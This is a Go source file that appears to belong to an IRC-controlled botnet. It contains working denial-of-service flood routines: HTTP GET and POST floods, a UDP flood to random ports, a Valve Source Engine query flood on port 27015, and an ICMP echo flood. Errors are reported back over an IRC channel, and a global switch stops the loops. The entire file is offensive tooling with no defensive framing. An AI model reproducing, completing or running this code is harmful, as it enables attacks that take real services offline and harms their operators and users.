package pkg

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var DDoS_Switch bool

//I miss understand about HTTP get flood concept. Will fix in v0.4
func GET(getTarget, set_chan string, reportIRC net.Conn) {
	agent_array := []string{
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
	}
	get_request, err := http.NewRequest("GET", getTarget+"/"+"user-agent", nil)
	if err != nil {
		IRC_Report(reportIRC, set_chan, err.Error())
	}
	_get := &http.Client{}

	for {
		for i := range agent_array {
			get_request.Header.Set("User-Agent", agent_array[i])
			_get.Do(get_request)
		}
		if DDoS_Switch {
			break
		}
	}
}

func POST(postTarget, set_chan string, reportIRC net.Conn) {
	buffer := make([]byte, 50)
	reqBody, _ := json.Marshal(map[string]string{
		"email":    string(buffer),
		"password": string(buffer),
	})
	post_request, err := http.NewRequest("POST", postTarget+"/"+string(reqBody), nil)
	if err != nil {
		IRC_Report(reportIRC, set_chan, err.Error())
	}
	_post := &http.Client{}

	for {
		_post.Do(post_request)
		if DDoS_Switch {
			break
		}
	}
}

func udp_packetCraft(udpTarget, set_chan, port string, buffer []byte, reportIRC net.Conn) {
	udp, err := net.Dial("udp", udpTarget+":"+port)
	if err != nil {
		IRC_Report(reportIRC, set_chan, err.Error())
	}
	udp.Write(buffer)
	udp.Close()
}

func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
	for {
		_size, _ := strconv.Atoi(size)
		if _size <= 0 || _size > 700 {
			_size = 700
		}
		dudpbuff := make([]byte, _size)
		udp_packetCraft(udpTarget, set_chan, fmt.Sprint(rand.Intn(65535)), dudpbuff, reportIRC)
		if DDoS_Switch {
			break
		}
	}
}

func VSE(vseTarget, set_chan string, reportIRC net.Conn) {
	for {
		vsebuff := []byte("TSource Engine Query")
		udp_packetCraft(vseTarget, set_chan, "27015", vsebuff, reportIRC)
		if DDoS_Switch {
			break
		}
	}
}

func ICMP(icmpTarget, set_chan string, reportIRC net.Conn) {
	conn, err := icmp.ListenPacket("udp4", "0.0.0.0")
	if err != nil {
		IRC_Report(reportIRC, set_chan, err.Error())
	}
	defer conn.Close()

	buffer := make([]byte, 1470) //Max of bytes.
	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: 1,
			Data: []byte(buffer),
		},
	}

	for {
		wb, _ := wm.Marshal(nil)
		conn.WriteTo(wb, &net.UDPAddr{IP: net.ParseIP(icmpTarget)})
		if DDoS_Switch {
			break
		}
	}
}
